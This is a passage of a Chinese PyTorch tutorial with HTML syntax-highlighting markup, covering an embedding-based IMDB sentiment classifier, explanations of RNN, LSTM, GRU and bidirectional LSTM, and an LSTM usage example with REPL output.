punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">322</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">270</span><span class="token punctuation">,</span> <span class="token number">317</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">379</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>思考：前面我们自定义了MAX_LEN作为句子的最大长度，如果我们需要把每个batch中的最长的句子长度作为当前batch的最大长度，该如何实现？</p></blockquote><h4 id="4-构建模型">4. 构建模型</h4><p>这里我们只练习使用word embedding，所以模型只有一层，即：</p><ol><li>数据经过word embedding</li><li>数据通过全连接层返回结果，计算<code>log_softmax</code></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">as</span> nn<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional <span class="token keyword">as</span> F<span class="token keyword">from</span> torch <span class="token keyword">import</span> optim<span class="token keyword">from</span> build_dataset <span class="token keyword">import</span> get_dataloader<span class="token punctuation">,</span>ws<span class="token punctuation">,</span>MAX_LEN<span class="token keyword">class</span> <span class="token class-name">IMDBModel</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>max_len<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>IMDBModel<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>embedding <span class="token operator">=</span> nn<span class="token punctuation">.</span>Embedding<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ws<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span>padding_idx<span class="token operator">=</span>ws<span class="token punctuation">.</span>PAD<span class="token punctuation">)</span> <span class="token comment">#[N,300]</span>        self<span class="token punctuation">.</span>fc <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>max_len<span class="token operator">*</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment">#[max_len*300,10]</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        embed <span class="token operator">=</span> self<span class="token punctuation">.</span>embedding<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token comment">#[batch_size,max_len,300]</span>        embed <span class="token operator">=</span> embed<span class="token punctuation">.</span>view<span class="token punctuation">(</span>x<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        out <span class="token operator">=</span> self<span class="token punctuation">.</span>fc<span class="token punctuation">(</span>embed<span class="token punctuation">)</span>        <span class="token keyword">return</span> F<span class="token punctuation">.</span>log_softmax<span class="token punctuation">(</span>out<span class="token punctuation">,</span>dim<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-模型的训练和评估">5. 模型的训练和评估</h4><p>训练流程和之前相同</p><ol><li>实例化模型，损失函数，优化器</li><li>遍历dataset_loader，梯度置为0，进行向前计算</li><li>计算损失，反向传播优化损失，更新参数</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">train_batch_size <span class="token operator">=</span> <span class="token number">128</span>test_batch_size <span class="token operator">=</span> <span class="token number">1000</span>imdb_model <span class="token operator">=</span> IMDBModel<span class="token punctuation">(</span>MAX_LEN<span class="token punctuation">)</span>optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span>imdb_model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>criterion <span class="token operator">=</span> nn<span class="token punctuation">.</span>CrossEntropyLoss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">train</span><span class="token punctuation">(</span>epoch<span class="token punctuation">)</span><span class="token punctuation">:</span>    mode <span class="token operator">=</span> <span class="token boolean">True</span>    imdb_model<span class="token punctuation">.</span>train<span class="token punctuation">(</span>mode<span class="token punctuation">)</span>    train_dataloader <span class="token operator">=</span>get_dataloader<span class="token punctuation">(</span>mode<span class="token punctuation">,</span>train_batch_size<span class="token punctuation">)</span>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">,</span>input_lenght<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">)</span><span class="token punctuation">:</span>        optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>        output <span class="token operator">=</span> imdb_model<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>        loss <span class="token operator">=</span> F<span class="token punctuation">.</span>nll_loss<span class="token punctuation">(</span>output<span class="token punctuation">,</span>target<span class="token punctuation">)</span> <span class="token comment">#traget需要是[0,9]，不能是[1-10]</span>        loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>        optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> idx <span class="token operator">%</span><span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Train Epoch: {} [{}/{} ({:.0f}%)]\tLoss: {:.6f}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                epoch<span class="token punctuation">,</span> idx <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">,</span>                       <span class="token number">100</span><span class="token punctuation">.</span> <span class="token operator">*</span> idx <span class="token operator">/</span> <span class="token builtin">len</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">)</span><span class="token punctuation">,</span> loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>imdb_model<span class="token punctuation">.</span>state_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"model/mnist_net.pkl"</span><span class="token punctuation">)</span>            torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>optimizer<span class="token punctuation">.</span>state_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'model/mnist_optimizer.pkl'</span><span class="token punctuation">)</span>             <span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    test_loss <span class="token operator">=</span> <span class="token number">0</span>    correct <span class="token operator">=</span> <span class="token number">0</span>    mode <span class="token operator">=</span> <span class="token boolean">False</span>    imdb_model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    test_dataloader <span class="token operator">=</span> get_dataloader<span class="token punctuation">(</span>mode<span class="token punctuation">,</span> test_batch_size<span class="token punctuation">)</span>    <span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> target<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">,</span> input_lenght <span class="token keyword">in</span> test_dataloader<span class="token punctuation">:</span>            output <span class="token operator">=</span> imdb_model<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>            test_loss  <span class="token operator">+=</span> F<span class="token punctuation">.</span>nll_loss<span class="token punctuation">(</span>output<span class="token punctuation">,</span> target<span class="token punctuation">,</span>reduction<span class="token operator">=</span><span class="token string">"sum"</span><span class="token punctuation">)</span>            pred <span class="token operator">=</span> torch<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span>dim<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>keepdim<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            correct <span class="token operator">=</span> pred<span class="token punctuation">.</span>eq<span class="token punctuation">(</span>target<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        test_loss <span class="token operator">=</span> test_loss<span class="token operator">/</span><span class="token builtin">len</span><span class="token punctuation">(</span>test_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nTest set: Avg. loss: {:.4f}, Accuracy: {}/{} ({:.2f}%)\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            test_loss<span class="token punctuation">,</span> correct<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token number">100</span><span class="token punctuation">.</span> <span class="token operator">*</span> correct <span class="token operator">/</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    test<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        train<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        test<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们仅仅使用了一层全连接层，其分类效果不会很好，这里重点是理解常见的模型流程和word embedding的使用方法</p><h3 id="2-3-循环神经网络">2.3 循环神经网络</h3><h4 id="2-3-1-循环神经网络的介绍">2.3.1 循环神经网络的介绍</h4><blockquote><p>为什么有了神经网络还需要有循环神经网络？</p></blockquote><p>在普通的神经网络中，信息的传递是单向的，这种限制虽然使得网络变得更容易学习，但在一定程度上也减弱了神经网络模型的能力。特别是在很多现实任务中，网络的输出不仅和当前时刻的输入相关，也和其过去一段时间的输出相关。此外，普通网络难以处理时序数据，比如视频、语音、文本等，时序数据的长度一般是不固定的，而前馈神经网络要求输入和输出的维数都是固定的，不能任意改变。因此，当处理这一类和时序相关的问题时，就需要一种能力更强的模型。</p><p>循环神经网络（Recurrent Neural Network，RNN）是一类具有短期记忆能力的神经网络。在循环神经网络中，神经元不但可以接受其它神经元的信息，也可以接受自身的信息，形成具有环路的网络结构。换句话说：神经元的输出可以在下一个时间步直接作用到自身（</p><p>入）</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5CRNN%E5%9B%BE.png" alt=""></p><p>通过简化图，我们看到RNN比传统的神经网络多了一个循环圈，这个循环表示的就是在下一个时间步（<strong>Time Step</strong>）上会返回作为输入的一部分，我们把RNN在时间点上展开，得到的图形如下：</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5CRNN%E5%B1%95%E5%BC%80.png" alt=""></p><p>或者是：</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5C%E5%9F%BA%E7%A1%80%E7%9A%84RNN%E5%B1%95%E5%BC%80%E5%9B%BE.png" alt=""></p><p>在不同的时间步，RNN的输入都将与之前的时间状态有关，$t_n$时刻网络的输出结果是该时刻的输入和所有历史共同作用的结果，这就达到了对时间序列建模的目的。</p><p>RNN的不同表示和功能可以通过下图看出：</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5CRNN%E5%8A%9F%E8%83%BD.png" alt=""></p><ul><li>图1：固定长度的输入和输出 (e.g. 图像分类)</li><li>图2：序列输出 (e.g.图像转文字)</li><li>图3：数列输入 (e.g. 文本分类)</li><li>图4：异步的序列输入和输出(e.g.文本翻译).</li><li>图5：同步的序列输入和输出 (e.g. 根据视频的每一帧来对视频进行分类)</li></ul><h4 id="2-1-LSTM的基础介绍">2.1 LSTM的基础介绍</h4><p>假如现在有这样一个需求，根据现有文本预测下一个词语，比如<code>天上的云朵漂浮在__</code>，通过间隔不远的位置就可以预测出来词语是<code>天上</code>，但是对于其他一些句子，可能需要被预测的词语在前100个词语之前，那么此时由于间隔非常大，随着间隔的增加可能会导致真实的预测值对结果的影响变的非常小，而无法非常好的进行预测（RNN中的长期依赖问题（long-Term Dependencies））</p><p>那么为了解决这个问题需要<strong>LSTM</strong>（<strong>Long Short-Term Memory网络</strong>）</p><p>LSTM是一种RNN特殊的类型，可以学习长期依赖信息。在很多问题上，LSTM都取得相当巨大的成功，并得到了广泛的应用。</p><p>一个LSMT的单元就是下图中的一个绿色方框中的内容：</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5CLSTM1.jpg" alt=""></p><p>其中$\sigma$表示sigmod函数，其他符号的含义：</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5CLSTM2.jpg" alt=""></p><h4 id="2-2-LSTM的核心">2.2 LSTM的核心</h4><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5CLSTM3.png" alt=""></p><p>LSTM的核心在于单元（细胞）中的状态，也就是上图中最上面的那根线。</p><p>但是如果只有上面那一条线，那么没有办法实现信息的增加或者删除，所以在LSTM是通过一个叫做<code>门</code>的结构实现，门可以选择让信息通过或者不通过。</p><p>这个门主要是通过sigmoid和点乘（<code>pointwise multiplication</code>）实现的</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5CLSTM4.png" alt=""></p><p>我们都知道，$sigmoid$的取值范围是在(0,1)之间，如果接近0表示不让任何信息通过，如果接近1表示所有的信息都会通过</p><h4 id="2-3-逐步理解LSTM">2.3 逐步理解LSTM</h4><h5 id="2-3-1-遗忘门">2.3.1 遗忘门</h5><p>遗忘门通过sigmoid函数来决定哪些信息会被遗忘</p><p>在下图就是$h_{t-1}和x_t$进行合并（concat）之后乘上权重和偏置，通过sigmoid函数，输出0-1之间的一个值，这个值会和前一次的细胞状态($C_{t-1}$)进行点乘，从而决定遗忘或者保留</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5C%E6%98%93%E7%8E%8B%E9%97%A8.png" alt=""></p><h5 id="2-3-2-输入门">2.3.2 输入门</h5><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5C%E8%BE%93%E5%85%A5%E9%97%A8.png" alt=""></p><p>下一步就是决定哪些新的信息会被保留，这个过程有两步：</p><ol><li>一个被称为<code>输入门</code>的sigmoid 层决定哪些信息会被更新</li><li><code>tanh</code>会创造一个新的候选向量$\widetilde{C}_{t}$，后续可能会被添加到细胞状态中</li></ol><p>例如：</p><p><code>我昨天吃了苹果，今天我想吃菠萝</code>，在这个句子中，通过遗忘门可以遗忘<code>苹果</code>,同时更新新的主语为<code>菠萝</code></p><p>现在就可以更新旧的细胞状态$C_{t-1}$为新的$C_{ t }$ 了。</p><p>更新的构成很简单就是：</p><ol><li>旧的细胞状态和遗忘门的结果相乘</li><li>然后加上 输入门和tanh相乘的结果</li></ol><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5CLSTM-update.png" alt=""></p><h5 id="2-3-3-输出门">2.3.3 输出门</h5><p>最后，我们需要决定什么信息会被输出，也是一样这个输出经过变换之后会通过sigmoid函数的结果来决定那些细胞状态会被输出。</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5C%E8%BE%93%E5%87%BA%E9%97%A8.png" alt=""></p><p>步骤如下：</p><ol><li>前一次的输出和当前时间步的输入的组合结果通过sigmoid函数进行处理得到$O_t$</li><li>更新后的细胞状态$C_t$会经过tanh层的处理，把数据转化到(-1,1)的区间</li><li>tanh处理后的结果和$O_t$进行相乘，把结果输出同时传到下一个LSTM的单元</li></ol><h4 id="2-4-GRU，LSTM的变形">2.4 GRU，LSTM的变形</h4><p>GRU(Gated Recurrent Unit),是一种LSTM的变形版本， 它将遗忘和输入门组合成一个“更新门”。它还合并了单元状态和隐藏状态，并进行了一些其他更改，由于他的模型比标准LSTM模型简单，所以越来越受欢迎。</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5CGRU.png" alt=""></p><p>LSTM内容参考地址：<a href="https://colah.github.io/posts/2015-08-Understanding-LSTMs/">https://colah.github.io/posts/2015-08-Understanding-LSTMs/</a></p><h4 id="3-双向LSTM">3. 双向LSTM</h4><p>单向的 RNN，是根据前面的信息推出后面的，但有时候只看前面的词是不够的， 可能需要预测的词语和后面的内容也相关，那么此时需要一种机制，能够让模型不仅能够从前往后的具有记忆，还需要从后往前需要记忆。此时双向LSTM就可以帮助我们解决这个问题</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5Cbidir_lstm.png" alt=""></p><p>由于是双向LSTM，所以每个方向的LSTM都会有一个输出，最终的输出会有2部分，所以往往需要concat的操作</p><h3 id="2-4-循环神经网络实现文本情感分类">2.4 循环神经网络实现文本情感分类</h3><h4 id="1-Pytorch中LSTM和GRU模块使用">1. Pytorch中LSTM和GRU模块使用</h4><h5 id="1-1-LSTM介绍">1.1 LSTM介绍</h5><p>LSTM和GRU都是由<code>torch.nn</code>提供</p><p>通过观察文档，可知LSMT的参数，</p><p><code>torch.nn.LSTM(input_size,hidden_size,num_layers,batch_first,dropout,bidirectional)</code></p><ol><li><code>input_size </code>：输入数据的形状，即embedding_dim</li><li><code>hidden_size</code>：隐藏层神经元的数量，即每一层有多少个LSTM单元</li><li><code>num_layer</code> ：即RNN的中LSTM单元的层数</li><li><code>batch_first</code>：默认值为False，输入的数据需要<code>[seq_len,batch,feature]</code>,如果为True，则为<code>[batch,seq_len,feature]</code></li><li><code>dropout</code>:dropout的比例，默认值为0。dropout是一种训练过程中让部分参数随机失活的一种方式，能够提高训练速度，同时能够解决过拟合的问题。这里是在LSTM的最后一层，对每个输出进行dropout</li><li><code>bidirectional</code>：是否使用双向LSTM,默认是False</li></ol><p>实例化LSTM对象之后,<strong>不仅需要传入数据，还需要前一次的h_0(前一次的隐藏状态)和c_0（前一次memory）</strong></p><p>即：<code>lstm(input,(h_0,c_0))</code></p><p>LSTM的默认输出为<code>output, (h_n, c_n)</code></p><ol><li><code>output</code>：<code>(seq_len, batch, num_directions * hidden_size)</code>—&gt;batch_first=False</li><li><code>h_n</code>:<code>(num_layers * num_directions, batch, hidden_size)</code></li><li><code>c_n</code>: <code>(num_layers * num_directions, batch, hidden_size)</code></li></ol><h5 id="1-2-LSTM使用示例">1.2 LSTM使用示例</h5><p>假设数据输入为 input ,形状是<code>[10,20]</code>，假设embedding的形状是<code>[100,30]</code></p><p>则LSTM使用示例如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">batch_size <span class="token operator">=</span><span class="token number">10</span>seq_len <span class="token operator">=</span> <span class="token number">20</span>embedding_dim <span class="token operator">=</span> <span class="token number">30</span>word_vocab <span class="token operator">=</span> <span class="token number">100</span>hidden_size <span class="token operator">=</span> <span class="token number">18</span>num_layer <span class="token operator">=</span> <span class="token number">2</span><span class="token comment">#准备输入数据</span><span class="token builtin">input</span> <span class="token operator">=</span> torch<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>low<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>high<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span>batch_size<span class="token punctuation">,</span>seq_len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#准备embedding</span>embedding  <span class="token operator">=</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Embedding<span class="token punctuation">(</span>word_vocab<span class="token punctuation">,</span>embedding_dim<span class="token punctuation">)</span>lstm <span class="token operator">=</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>LSTM<span class="token punctuation">(</span>embedding_dim<span class="token punctuation">,</span>hidden_size<span class="token punctuation">,</span>num_layer<span class="token punctuation">)</span><span class="token comment">#进行mebed操作</span>embed <span class="token operator">=</span> embedding<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span> <span class="token comment">#[10,20,30]</span><span class="token comment">#转化数据为batch_first=False</span>embed <span class="token operator">=</span> embed<span class="token punctuation">.</span>permute<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#[20,10,30]</span><span class="token comment">#初始化状态， 如果不初始化，torch默认初始值为全0</span>h_0 <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>num_layer<span class="token punctuation">,</span>batch_size<span class="token punctuation">,</span>hidden_size<span class="token punctuation">)</span>c_0 <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>num_layer<span class="token punctuation">,</span>batch_size<span class="token punctuation">,</span>hidden_size<span class="token punctuation">)</span>output<span class="token punctuation">,</span><span class="token punctuation">(</span>h_1<span class="token punctuation">,</span>c_1<span class="token punctuation">)</span> <span class="token operator">=</span> lstm<span class="token punctuation">(</span>embed<span class="token punctuation">,</span><span class="token punctuation">(</span>h_0<span class="token punctuation">,</span>c_0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#output [20,10,1*18]</span><span class="token comment">#h_1 [2,10,18]</span><span class="token comment">#c_1 [2,10,18]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">122</span><span class="token punctuation">]</span><span class="token punctuation">:</span> output<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">122</span><span class="token punctuation">]</span><span class="token punctuation">:</span> torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span>In <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">:</span> h_1<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">:</span> torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span>In <span class="token punctuation">[</span><span class="token number">124</span><span class="token punctuation">]</span><span class="token punctuation">:</span> c_1<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">124</span><span class="token punctuation">]</span><span class="token punctuation">:</span> torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过前面的学习，我们知道，最后一次的h_1应该和output的最后一个time step的输出是一样的</p><p>通过下面的代码，我们来验证一下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">179</span><span class="token punctuation">]</span><span class="token punctuation">:</span> a <span class="token operator">=</span> output<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span>In <span class="token punctuation">[</span><span class="token number">180</span><span class="token punctuation">]</span><span class="token punctuation">:</span> a<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">180</span><span class="token punctuation">]</span><span class="token punctuation">:</span> torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span>In <span class="token punctuation">[</span><span class="token number">183</span><span class="token punctuation">]</span><span class="token punctuation">:</span> b<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">183</span><span class="token punctuation">]</span><span class="token punctuation">:</span> torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span>In <span class="token punctuation">[</span><span class="token number">184</span><span class="token punctuation">]</span><span class="token punctuation">:</span> a <span class="token operator">==</span> bOut<span class="token punctuation">[</span><span class="token number">184</span><span class="token punctuation">]</span><span class="token punctuation">:</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token 